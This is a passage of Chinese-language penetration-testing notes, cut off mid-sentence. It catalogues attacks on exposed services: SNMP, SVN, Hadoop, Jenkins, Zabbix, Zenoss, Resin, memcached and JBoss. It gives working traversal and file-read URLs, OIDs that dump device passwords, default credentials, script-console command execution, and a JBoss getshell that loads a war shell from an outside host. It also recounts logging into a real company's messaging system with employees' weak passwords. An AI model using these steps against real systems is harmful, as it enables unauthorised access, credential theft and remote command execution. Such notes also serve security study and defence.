+<p><a target="_blank" rel="noopener" href="http://www.xxx.com/database">http://www.xxx.com/database</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.com/..%2f..%2f..%2f..%2fetc%2fpasswd">http://www.xxx.com/..%2f..%2f..%2f..%2fetc%2fpasswd</a></p>
+<h1 id="12-SNMP信息泄露"><a href="#12-SNMP信息泄露" class="headerlink" title="12 SNMP信息泄露 "></a>12 SNMP信息泄露 </h1><p>drops.wooyun.org/tips/409</p>
+<h2 id="12-1-基本原理"><a href="#12-1-基本原理" class="headerlink" title="12.1 基本原理 "></a>12.1 基本原理 </h2><p>SNMP（简单网络管理协议）：该协议能够支持网络管理系统，用以监测连接到网络上的设备是否有任何引起管理上关注的情况。目前共有V1、V2、V3三个版本，应用比较广泛的还是前两个版本，同时存在安全问题也较多。</p>
+<p>Cacti、Mrtg等监控工具都基于snmp协议。其原理可以简单理解为：</p>
+<p>管理主机向被管理的主机或设备发送一个请求（包含community和oid）</p>
+<p>（community相当于认证口令）</p>
+<p>（oid为代号，例如112代表CPU使用率，113代表内存使用率）</p>
+<p>被管理设备收到请求后先查看community是否与自己保持的一致，若一致则返回请求</p>
+<p>信息，若不一致则不返回任何信息。</p>
+<p>此外，管理主机通过snmp协议除了可以获取被管理主机的信息外，还可以修改其配置</p>
+<p>信息（主要是路由交换设备方面）。</p>
+<h2 id="12-2-snmp弱口令"><a href="#12-2-snmp弱口令" class="headerlink" title="12.2 snmp弱口令 "></a>12.2 snmp弱口令 </h2><p>snmp服务器的默认密码为public，漏洞发现与扫描：</p>
+<ul>
+<li><p>x-scan扫描 + GFI LANGard利用</p>
+</li>
+<li><p>使用Snmp Digger进行漏洞利用</p>
+</li>
+<li><p>snmputil.exe</p>
+</li>
+</ul>
+<p>snmputil.exe get|getnext|walk agent community oid[oid……]</p>
+<p>当前进程列表 snmputil.exe walk ip public<br>.1.3.6.1.2.1.25.4.2.1.2</p>
+<p>系统用户列表 snmputil.exe walk ip public<br>.1.3.6.1.4.1.77.1.2.25.1.1</p>
+<p>列 出 域 名 snmputil.exe walk ip public<br>.1.3.6.1.4.1.77.1.4.1.0</p>
+<p>列出安装软件 snmputil.exe walk ip public<br>.1.3.6.1.2.1.25.6.3.1.2</p>
+<p>列出系统信息 snmputil.exe walk ip public .1.3.6.1.2.1.1</p>
+<ul>
+<li>IP Network<br>Browser（snmp浏览工具）</li>
+</ul>
+<h2 id="12-3-snmp获取管理员密码"><a href="#12-3-snmp获取管理员密码" class="headerlink" title="12.3 snmp获取管理员密码 "></a>12.3 snmp获取管理员密码 </h2><p>snmp默认开放端口: 161</p>
+<ul>
+<li>H3C防火墙：通过SNMP只读权限的团体字符串便可以读到管理密码，从而控制设备。（WooYun-2013-21877(<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2013-021877)%EF%BC%89">http://www.wooyun.org/bugs/wooyun-2013-021877)）</a></li>
+</ul>
+<p>扫描工具：<br>solarwinds中的snmpsweep</p>
+<p>升级版：solarwinds工具包中的 ip browser</p>
+<ul>
+<li>华为quidway三层交换</li>
+</ul>
+<p>利用这个OID读出的密码为明文（WooYun-2013-21964(<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2013-021964)%EF%BC%89">http://www.wooyun.org/bugs/wooyun-2013-021964)）</a></p>
+<p>root@bt:~# snmpwalk -c private -v 1 x.x.x.x<br>1.3.6.1.4.1.2011.5.2.1.10.1</p>
+<p>对于存在该漏洞的设备，目前已知可以获取帐号的oid有一下三个（walk）:</p>
+<p>1.3.6.1.4.1.2011.5.2.1.10.1</p>
+<p>1.3.6.1.4.1.2011.10.2.12.1.1.1</p>
+<p>1.3.6.1.4.1.25506.2.12.1.1.1</p>
+<h2 id="12-4-实战演练"><a href="#12-4-实战演练" class="headerlink" title="12.4 实战演练 "></a>12.4 实战演练 </h2><p><code>snmpwalk -v 2c -c public xx.xx.xx.xx</code></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_41e07a3a71e3e362.png"></p>
+<h1 id="13-SVN源码泄露"><a href="#13-SVN源码泄露" class="headerlink" title="13 SVN源码泄露 "></a>13 SVN源码泄露 </h1><p>drops.wooyun.org/tips/352(<a target="_blank" rel="noopener" href="http://drops.wooyun.org/tips/352">http://drops.wooyun.org/tips/352</a>)</p>
+<h2 id="13-1-SVN介绍"><a href="#13-1-SVN介绍" class="headerlink" title="13.1 SVN介绍 "></a>13.1 SVN介绍 </h2><p>Subversion，简称SVN，是一个开放源代码的版本控制系统。在开源软件的开发过程中，由于开发方式自由和开发人员分散等特性，版本控制问题一直关系到项目成败，没有版本控制开源软件的开发过程就会变得混乱和不可控制。</p>
+<p>Subversion使用服务端—客户端的结构（当然服务端与客户端可以都运行在同一台服务器上）。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。两端间通过各种仓库存取层（Repository<br>Access，简称RA）的多条通道（通道中可以通过不同的网络协议比如HTTP、SSH或本地文件等）进行访问的。</p>
+<p>svn默认端口是3690</p>
+<h2 id="13-2-漏洞原理"><a href="#13-2-漏洞原理" class="headerlink" title="13.2 漏洞原理 "></a>13.2 漏洞原理 </h2><p>程序导出方式：</p>
+<p>在现实开发环境中，建议使用导出功能svn<br>export（而不是svn co）</p>
+<p>svn co ：【导出结果带 .svn<br>文件夹的目录树】</p>
+<p>svn co http://路径[本地目录全路径]<br>–username 用户名 –password 密码</p>
+<p>svn co svn://路径[本地目录全路径]<br>–username 用户名 –password 密码</p>
+<p>svn export ：【导出结果不带 .svn<br>文件夹的目录树】</p>
+<p>svn export [-r版本号]<br>http://路径[本地目录全路径] –username<br>用户名 –password 密码</p>
+<p>svn export [-r版本号]<br>svn://路径[本地目录全路径] –username<br>用户名 –password 密码</p>
+<p>漏洞产生原因：</p>
+<p>在实际开发环境中，很管理员直接把svn<br>co导出来的代码放到web目录下，致使 .svn<br>隐藏文件夹暴露于外网环境中，恶意攻击者可以借助其中包含的用于版本信息追踪的“entries”文件逐步摸清站点结构。</p>
+<p>漏洞利用方式：</p>
+<p>若 .svn目录没有做访问权限限制，可以通过<br>.svn 来遍历文件和目录列表。</p>
+<p>若<br>*.php.svn-base被当做php来执行，若暴露php错误信息(真实路径)或空白内容，则该站点存在扩展名问题，找文件上传处上传xx.php.gif文件获取webshell。</p>
+<p>若<br>*.php.svn-base不当做php文件执行，则可下载svn中的所有php源码文件。</p>
+<ul>
+<li><p>直接在浏览器中访问 /.svn/entries</p>
+</li>
+<li><p>利用seay的svn工具</p>
+</li>
+</ul>
+<h1 id="14-hadhoop应用对外访问"><a href="#14-hadhoop应用对外访问" class="headerlink" title="14 hadhoop应用对外访问 "></a>14 hadhoop应用对外访问 </h1><h2 id="14-1-基础概念"><a href="#14-1-基础概念" class="headerlink" title="14.1 基础概念 "></a>14.1 基础概念 </h2><p>Hadoop是一个由apache基金会所开发的分布式系统基础架构。用户可以在不了解分布式底层细节的情况下，开发分布式程序。充分利用集群的威力进行高速运算和存储。</p>
+<h2 id="14-2-漏洞利用"><a href="#14-2-漏洞利用" class="headerlink" title="14.2 漏洞利用 "></a>14.2 漏洞利用 </h2><p>默认开放端口：</p>
+<p>hadoop 50070</p>
+<p>hbase 50075</p>
+<p>hdfs 50090</p>
+<ul>
+<li><p>Hadoop管理界面弱口令，例如：admin 123456<br>WooYun-2014-58320(<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2014-058320">http://www.wooyun.org/bugs/wooyun-2014-058320</a>)</p>
+</li>
+<li><p>Hadoop远程命令执行，通过hadoop，hbase，hdfs0.2<br>RC版本的管理web端能远程执行命令（jstack<br>pstack<br>servlet执行命令），通过该节点对集群服务器进行任务分发（该项是基本功能，可以进行批量提权linux主机），从而渗透进hadoop集群。<br>WooYun-2013-20282(<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2013-020282">http://www.wooyun.org/bugs/wooyun-2013-020282</a>)</p>
+</li>
+</ul>
+<h1 id="15-Nagios信息泄露"><a href="#15-Nagios信息泄露" class="headerlink" title="15 Nagios信息泄露 "></a>15 Nagios信息泄露 </h1><p>Nagios是一个监视系统运行状态和网络信息的监视系统。Nagios能监视所指定的本地或远程主机及服务，可运行在linux、unix平台上，同时提供一个基于浏览器的WEB界面以方便系统管理人员查看网络状态，各种系统问题以及日志等等。</p>
+<h2 id="15-1-漏洞利用"><a href="#15-1-漏洞利用" class="headerlink" title="15.1 漏洞利用 "></a>15.1 漏洞利用 </h2><p>Nagios运维监控API接口暴露<br>WooYun-2014-86842(<a target="_blank" rel="noopener" href="http://wooyun.org/bugs/wooyun-2014-086842">http://wooyun.org/bugs/wooyun-2014-086842</a>)</p>
+<h1 id="16-RTX即时通信信息泄露"><a href="#16-RTX即时通信信息泄露" class="headerlink" title="16 RTX即时通信信息泄露 "></a>16 RTX即时通信信息泄露 </h1><p>腾讯通RTX(Real Time<br>eXchange)是腾讯公司推出的企业级即时通信平台。企业员工可以轻松地通过服务器配置的组织架构查找需要进行通信的人员，并采用丰富的沟通方式进行实时沟通。文本消息、文本传输、直接语音会话或者视频的形式满足不同办公环境下的沟通需求。</p>
+<h2 id="16-1-漏洞利用"><a href="#16-1-漏洞利用" class="headerlink" title="16.1 漏洞利用 "></a>16.1 漏洞利用 </h2><p>默认开放端口： 8012</p>
+<ul>
+<li>开放应用端口暴露：<br><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx:8012/userlist.php">http://xx.xx.xx.xx:8012/userlist.php</a></li>
+</ul>
+<p>直接可以访问到所有用户id、用户名等信息的json</p>
+<p>在“查看审核结果处”尝试用户名+弱口令(3102<br>或123456)登陆，登陆成功后即进入内部网络。</p>
+<ul>
+<li>得到用户名后，可以读取手机号</li>
+</ul>
+<p>用户名： rtx.bxlq.com/userlist.php</p>
+<p>手机号：<br>rtx.bxlq.com/getmobile.cgi?receiver=用户名</p>
+<h2 id="16-2-动手实践"><a href="#16-2-动手实践" class="headerlink" title="16.2 动手实践 "></a>16.2 动手实践 </h2><p><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx:8012/userlist.php">http://xx.xx.xx.xx:8012/userlist.php</a> 中国某公司</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_e1c2ee9745806f6d.png"></p>
+<p>回到首页，查看审核结果处，进行弱口令尝试：高X军<br>/ 123456</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_7d72e064c94b344c.png"></p>
+<p>回到首页，下载并安装客户端进行登陆</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_7624c1251b81f7c6.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_da7cf1ecb96eb2d.png"></p>
+<p>一直连接不上，最后用nmap扫描端口，一个个尝试，最终确定为9002</p>
+<p>高X军 123456</p>
+<p>桂X林 123456</p>
+<p>孔X月 123456</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_9c42e03c9ee49942.png"></p>
+<p>公司领导</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_4baa431beadedd58.png"></p>
+<h1 id="17-Ganglia系统监控信息泄露"><a href="#17-Ganglia系统监控信息泄露" class="headerlink" title="17 Ganglia系统监控信息泄露 "></a>17 Ganglia系统监控信息泄露 </h1><p>Ganglia是UC<br>Berkeley发起的一个开源集群监视项目，设计用于测量数以千计的节点。Ganglia的核心包含gmond、gmetad以及一个web前段。主要用来监控系统性能，如cpu、mem、硬盘利用率、I/O负载、网络流量情况等，通过曲线很容易见到每个节点的工作状态，对合理调整、分配系统资源，提高系统整体性能起到重要作用。</p>
+<p>工作原理：</p>
+<p>Ganglia包括如下几个程序，他们之间通过XDR(xml的压缩格式)或者XML格式传递监控数据，达到监控效果。集群内的节点，通过运行gmond收集发布节点状态信息，然后gmetad周期性的轮询gmond收集到的信息，然后存入rrd数据库，通过web服务器可以对其进行查询展示。</p>
+<h2 id="17-1-漏洞利用"><a href="#17-1-漏洞利用" class="headerlink" title="17.1 漏洞利用 "></a>17.1 漏洞利用 </h2><p>可以查看公司内部流量信息、被监控主机的配置信息及运行状态。</p>
+<p>开放端口：8649<br>（不确定，案例中还有开放8000）</p>
+<ul>
+<li><p>直接在浏览器地址栏输入IP:8649 eg:<br><a target="_blank" rel="noopener" href="http://xx.xx.xxx.xx:8649/">http://xx.xx.xxx.xx:8649/</a></p>
+</li>
+<li><p>直接访问域名：ganglia.xx.com</p>
+</li>
+<li><p>使用nc查看： nc.exe iii.com<br>8649 |more</p>
+</li>
+</ul>
+<h1 id="18-j2ee应用架构（web服务器搭配不当）"><a href="#18-j2ee应用架构（web服务器搭配不当）" class="headerlink" title="18 j2ee应用架构（web服务器搭配不当） "></a>18 j2ee应用架构（web服务器搭配不当） </h1><p>drops.wooyun.org/papers/60</p>
+<p>在通常的web应用中会将多个web服务器搭配着使用，以解决其中某台服务器的性能缺陷、负载均衡及完成一些分层结构的安全策略等。较常见的如：Nginx+Tomcat的分层结构</p>
+<p>Nginx：高性能的HTTP和反向代理服务器。通过它可以解决一些静态资源(图片、js、css等类型的文件)访问处理。</p>
+<p>Tomcat：免费开放源代码的j2ee<br>Web服务器。其性能缺陷：处理静态资源特别是图片文件时特别吃力。</p>
+<h2 id="18-1-漏洞成因"><a href="#18-1-漏洞成因" class="headerlink" title="18.1 漏洞成因 "></a>18.1 漏洞成因 </h2><p>由于处理方式或分层架构设计，如果对静态资源的目录或文件的映射配置不当，就会引发安全问题(特别是在j2ee应用中)。</p>
+<p>Tomcat的WEB-INF目录(每个j2ee的web应用部署文件默认包含该目录)，在tomcat中该目录禁止访问，包含以下内容：</p>
+<p>classes目录：包含该应用核心的java类编译后的class文件及部分配置文件；</p>
+<p>lib目录：所有框架、插件和组件的架包；</p>
+<p>web.xml目录：重要配置文件。(展开攻击的一把钥匙)</p>
+<p>Nginx在解析静态文件时，把web-inf目录映射进去，若没有做nginx相关安全配置或由于nginx自身缺陷影响，将导致通过nginx访问到tomcat的web-inf目录。</p>
+<p>通常，只配置nginx把与j2ee及开发架或自定义框架有关的url(例如：.jsp<br>、.do、.action…等)交给tomcat，剩下的大部分后缀类型的url直接交给nginx处理(包括web-inf中比较重要的.xml、class等类型)。</p>
+<h2 id="18-2-漏洞利用"><a href="#18-2-漏洞利用" class="headerlink" title="18.2 漏洞利用 "></a>18.2 漏洞利用 </h2><p>该问题普遍存在于大型站点应用中，由于j2ee应用自身的一些特性，例如：起点配置文件web.xml（/WEB-IINF/web.xml），若先找到它并结合j2ee的xml路径配置特点，就可以找到其他的配置文件(需进行反编译)，甚至获得整个应用的所有核心代码及应用架构的相关信息。</p>
+<h2 id="18-3-修复方案"><a href="#18-3-修复方案" class="headerlink" title="18.3 修复方案 "></a>18.3 修复方案 </h2><ul>
+<li><p>最好不要映射非静态文件目录或敏感目录；</p>
+</li>
+<li><p>修改nginx配置文件，禁止访问WEB-INF文件<br>:<code>Location ~ ^/WEB-INF/* &#123;deny all;&#125;</code></p>
+</li>
+</ul>
+<h1 id="19-Jenkins平台未设置登录验证"><a href="#19-Jenkins平台未设置登录验证" class="headerlink" title="19 Jenkins平台未设置登录验证 "></a>19 Jenkins平台未设置登录验证 </h1><p>Jenkins是基于java开发的一种持续集成工具，用于监控持续重复的工作，功能包括：(1)持续的软件版本发布/测试项目；(2)监控外部调用执行的工作。</p>
+<h2 id="19-1-漏洞利用"><a href="#19-1-漏洞利用" class="headerlink" title="19.1 漏洞利用 "></a>19.1 漏洞利用 </h2><ul>
+<li>未授权访问，可直接执行命令 wooyun-2013-028803</li>
+</ul>
+<p>直接在url中访问： eg:<br><a href="http://xx.xx.xx.xx:8080(http://xx.xx.xx.xx:8080/)">http://xx.xx.xx.xx:8080(http://xx.xx.xx.xx:8080/)</a><br>(端口视具体情况而定，案例中有3000、8888)</p>
+<ul>
+<li> <a target="_blank" rel="noopener" href="http://ip/script">http://ip/script</a></li>
+</ul>
+<p>java.lang.Runtime.getRuntime().exec(‘id’).getText();<br>行脚本并回显一句话</p>
+<h1 id="20-zabbix默认口令"><a href="#20-zabbix默认口令" class="headerlink" title="20 zabbix默认口令 "></a>20 zabbix默认口令 </h1><h2 id="20-1-基础知识"><a href="#20-1-基础知识" class="headerlink" title="20.1 基础知识 "></a>20.1 基础知识 </h2><p>Zabbix除了监控功能强大之处，还可以在忘记root密码的时候重置服务器root密码。（这也是一个超级后门）</p>
+<p>此外，system.run模块可以执行任意指令（agent在root权限下，不过一般都开启该权限）</p>
+<h2 id="20-2-利用方式"><a href="#20-2-利用方式" class="headerlink" title="20.2 利用方式 "></a>20.2 利用方式 </h2><p>弱口令进入后台： <a target="_blank" rel="noopener" href="http://ip/zabbix/">http://ip/zabbix/</a> admin / zabbix</p>
+<p>攻击方法：</p>
+<ul>
+<li><p>尝试system.run执行命令</p>
+</li>
+<li><p>获取zabbix server shell：</p>
+</li>
+</ul>
+<p>Administrator——&gt;Scripts——&gt;修改Commands(例如改为<br>uname -a)</p>
+<p>Monitoring——&gt;Last data——&gt;点击Zabbix<br>server，执行调用命令</p>
+<h1 id="21-zenoss默认口令"><a href="#21-zenoss默认口令" class="headerlink" title="21 zenoss默认口令 "></a>21 zenoss默认口令 </h1><h2 id="21-1-基本知识"><a href="#21-1-基本知识" class="headerlink" title="21.1 基本知识 "></a>21.1 基本知识 </h2><p>Zenoss<br>Core是开源企业级IT管理软件-智能监控软件，允许IT管理员依靠单一的WEB控制台来监控网络架构的状态和健康度。Zenoss同时也是开源的网络与系统管理软件。</p>
+<h2 id="21-2-漏洞利用"><a href="#21-2-漏洞利用" class="headerlink" title="21.2 漏洞利用 "></a>21.2 漏洞利用 </h2><p>ip:8080 admin / zenoss</p>
+<p>ip:8080/zport/dmd/Dashboard</p>
+<p>zenoss有一个commands功能，可以执行指令将指令修改为自己需要的即可），然后选中一台机器执行指令。</p>
+<p>在wooyun上所见到的案例中，最令人头疼的也最难理解的是：</p>
+<ul>
+<li><p>wooyun-2013-019917 反弹获取shell</p>
+</li>
+<li><p>wooyun-2013-019917<br>边界神器py版开启socks代理</p>
+</li>
+</ul>
+<p>（zone.wooyun.org/content/1693）</p>
+<ul>
+<li> wooyun-2013-019917<br>端口转发（将代理端口转发到公网）</li>
+</ul>
+<h1 id="22-Resin任意文件读取"><a href="#22-Resin任意文件读取" class="headerlink" title="22 Resin任意文件读取 "></a>22 Resin任意文件读取 </h1><h2 id="22-1-基本知识"><a href="#22-1-基本知识" class="headerlink" title="22.1 基本知识 "></a>22.1 基本知识 </h2><p>Resin：java应用服务器</p>
+<p>CAUCHO公司产品，是一个非常流行的application server<br>，对server和JSP提供良好的支持，速度非常快直逼APACHE<br>SERVER。Resin支持负载均衡，可以增加web站点的可靠性。</p>
+<h2 id="22-2-漏洞利用"><a href="#22-2-漏洞利用" class="headerlink" title="22.2 漏洞利用 "></a>22.2 漏洞利用 </h2><p>Resin的某个CGI程序实现上存在输入验证漏洞，远程攻击者可能利用此漏洞读取Web主目录下的任意文件。</p>
+<ul>
+<li>任意文件读取：</li>
+</ul>
+<p>配置文件：</p>
+<p><a target="_blank" rel="noopener" href="http://ip/resin-doc/examples/ico-periodictask/viewfile?file=WEB-INF/web.xml">http://ip/resin-doc/examples/ico-periodictask/viewfile?file=WEB-INF/web.xml</a></p>
+<p>读取源码：</p>
+<p><a target="_blank" rel="noopener" href="http://ip/resin-doc/examples/ico-periodictask/viewfile?file=index.xtp">http://ip/resin-doc/examples/ico-periodictask/viewfile?file=index.xtp</a></p>
+<p>读取password.xml</p>
+<p>ip/resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/password.xml</p>
+<ul>
+<li>resin文件包含漏洞shell (wooyun-2013-023139)</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://ip/Resin-doc/viewfile/?contextpath=C:%5C%5C&amp;servletpath=&amp;file=boot.ini">http://ip/Resin-doc/viewfile/?contextpath=C:\\&amp;servletpath=&amp;file=boot.ini</a></p>
+<ul>
+<li>resin弱口令</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://ip/resin-admin/status.php">http://ip/resin-admin/status.php</a> admin / admin</p>
+<ul>
+<li>resin版本过低，导致磁盘信息泄露</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://ip/c:/">http://ip/c:/</a></p>
+<h2 id="22-3-实例演练"><a href="#22-3-实例演练" class="headerlink" title="22.3 实例演练 "></a>22.3 实例演练 </h2><p><a target="_blank" rel="noopener" href="http://www.xx.cn/c:/">http://www.xx.cn/c:/</a> （wooyun-2013-041338）</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_c53a22d32c38834b.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_6a5593fbd445e703.png"></p>
+<h1 id="23-memcache未限制访问IP"><a href="#23-memcache未限制访问IP" class="headerlink" title="23 memcache未限制访问IP "></a>23 memcache未限制访问IP </h1><h2 id="23-1-基础知识"><a href="#23-1-基础知识" class="headerlink" title="23.1 基础知识 "></a>23.1 基础知识 </h2><p>Memcached是一个高性能的分布式内存对象缓存系统，用于动态web应用以减轻数据库负载。它通过内存缓存数据和对象来减少读取数据库的次数，从而提高动态、数据库驱动网站的速度。Memcached基于一个存储键/值对的hashmap。其守护进程是用C写的，但是客户端可以用任何语言来编写，并通过memcached协议与守护进程通信。</p>
+<h2 id="23-2-漏洞利用"><a href="#23-2-漏洞利用" class="headerlink" title="23.2 漏洞利用 "></a>23.2 漏洞利用 </h2><p>Memcached未限制IP导致cache泄露<br>服务默认端口：11211</p>
+<ul>
+<li>使用nc 反弹查看数据：</li>
+</ul>
+<p>nc.exe –vv ip 11211</p>
+<p>ip: inverse host lookup failed: h_errno 11004: NO_DATA</p>
+<p>(UNKNOWN) [ip] 11211 (?) open</p>
+<p>stats items</p>
+<p>STAT items:4:number 1544729</p>
+<p>…….</p>
+<ul>
+<li>memcached空口令访问 可以直接telnet登陆<br>wooyun-2010-0123604</li>
+</ul>
+<ul>
+<li>root@kali:~# nc ip 11211</li>
+</ul>
+<h2 id="23-3-实战演练"><a href="#23-3-实战演练" class="headerlink" title="23.3 实战演练 "></a>23.3 实战演练 </h2><p>root@Aerfa:~# nc -vv xx.xx.xx.xx 11211</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_ba1df478b9b7aee9.png"></p>
+<p>root@Aerfa:~# nc -vv yy.yy.yy.yy 11211</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_df926128a0be01ea.png"></p>
+<h1 id="24-Jboss配置不当"><a href="#24-Jboss配置不当" class="headerlink" title="24 Jboss配置不当 "></a>24 Jboss配置不当 </h1><p>drops.wooyun.org/papers/178</p>
+<h2 id="24-1-基本信息"><a href="#24-1-基本信息" class="headerlink" title="24.1 基本信息 "></a>24.1 基本信息 </h2><p>Jboss基于J2EE的开放源代码的应用服务器（JAVA应用服务器），是一个管理EJB的容器和服务器（Jboss企业中间件JEMS的一部分），其核心服务不包括service/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
+<p>Jboss应用服务框架：</p>
+<ul>
+<li>Java管理扩展（JMX）：监控管理java应用程序的标准化架构，分为三层：</li>
+</ul>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_7ca4d6381121d244.png"></p>
+<p>设备层（instrumentation）：定义信息模型。</p>
+<p>代理层（Agent）：定义各种服务以及通信模型，所有的管理构件都需要向他注册。</p>
+<p>分布服务层（distribute）：定义能对代理层进行操作的管理接口和构件。</p>
+<ul>
+<li>JMX<br>Invoker：允许客户端应用程序发送任意协议的JMX请求到服务端</li>
+</ul>
+<p>这些请求都是用MBean服务器发送到响应的Mbean服务</p>
+<ul>
+<li>Deployer架构：</li>
+</ul>
+<p>JAR（Java<br>Archives），用于压缩、发布、部署和封装库、组件、程序插件。</p>
+<p>WAR（Web<br>ARchives），JAR文件包含一个Web应用程序的组件。</p>
+<h2 id="24-2-漏洞利用"><a href="#24-2-漏洞利用" class="headerlink" title="24.2 漏洞利用 "></a>24.2 漏洞利用 </h2><ul>
+<li>WAR文件 </li>
+</ul>
+<p>在Jboss应用服务器上最简单的运行代码方式是部署一个组件，可以通过HTTP安装组件，war文件包需要在web-inf目录下包含一个web.xml文件。War文件可以使用java的SDK<br>jar命令创建。</p>
+<ul>
+<li>JMX Console</li>
+</ul>
+<p>web-console</p>
+<p>jmx-console</p>
+<p>invoker/JMXInvokerServlet</p>
+<p>JMX控制台允许通过web浏览器与Jboss应用服务器直接互动的组件，方便管理Jboss服务器，Mbean的属性与方法可以直接调用。</p>
+<p>JMX控制台通常是攻击的第一目标，Mbeans的属性（Server和ServerInfo）展现了Jboss应用服务器与主机系统的信息，包含java虚拟机以及操作系统的类型版本信息。</p>
+<p>Mbean的shutdown()方法可以关闭Jboss应用服务器，未授权的JMX接口可以导致拒绝服务攻击。</p>
+<p>War包的部署，执行shell命令。</p>
+<ul>
+<li>Jboss弱口令</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://ip/admin-console">http://IP/admin-console</a> admin / admin</p>
+<h2 id="24-3-实例应用"><a href="#24-3-实例应用" class="headerlink" title="24.3 实例应用 "></a>24.3 实例应用 </h2><p><a target="_blank" rel="noopener" href="http://yy.yy.yy.yy:8080/web-console/">http://yy.yy.yy.yy:8080/web-console/</a> 未授权访问</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_8e55e3f044ed0364.png"></p>
+<p>先下载java插件，再控制面板中找到java，设置java控制面板的安全属性，添加例外网站。</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_90d6709742b78542.png"></p>
+<h3 id="lt-1-gt-admin-console-getshell"><a href="#lt-1-gt-admin-console-getshell" class="headerlink" title="&lt;1&gt; admin-console getshell"></a>&lt;1&gt; admin-console getshell</h3><p><a target="_blank" rel="noopener" href="http://yy.yy.yy.yy/admin-console/">http://yy.yy.yy.yy/admin-console/</a> 无效</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_28bdb02a0cb5a373.png"></p>
+<h3 id="lt-2-gt-jmx-console-getshell"><a href="#lt-2-gt-jmx-console-getshell" class="headerlink" title="&lt;2&gt; jmx-console getshell"></a>&lt;2&gt; jmx-console getshell</h3><p><a target="_blank" rel="noopener" href="http://yy.yy.yy.yy/jmx-console/">http://yy.yy.yy.yy/jmx-console/</a> 存在</p>
+<p>需要将war包或jsp shell放到服务器上<br><a target="_blank" rel="noopener" href="http://p2j.cn/is.war">http://p2j.cn/is.war</a></p>
+<p>jboss.deployment——&gt;void addURL</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_d6a528da8f01270e.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_fa352df195521efa.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_5acfb48291d0131b.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_b4b2160d26750158.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_cc69a4e856862c50.png"></p>
+<p>上传成功，但是文件访问不存在</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_6201bba2e6c4598.png"></p>
+<h3 id="lt-3-gt-web-console-getshell"><a href="#lt-3-gt-web-console-getshell" class="headerlink" title="&lt;3&gt; web-console getshell"></a>&lt;3&gt; web-console getshell</h3><p><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx/web-console/">http://xx.xx.xx.xx/web-console/</a> 存在</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_15bb592501eaeab4.png"></p>
+<h3 id="lt-41-gt-invoker-getshell"><a href="#lt-41-gt-invoker-getshell" class="headerlink" title="&lt;41&gt; invoker getshell"></a>&lt;41&gt; invoker getshell</h3><p>inovker接口未配置认证信息</p>
+<p>yy.yy.yy.yy/invoker/JMXInvokerServlet</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_51cd584709c21a49.png"></p>
+<p>案例<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-0121861">http://www.wooyun.org/bugs/wooyun-2010-0121861</a>中使用curl命令：</p>
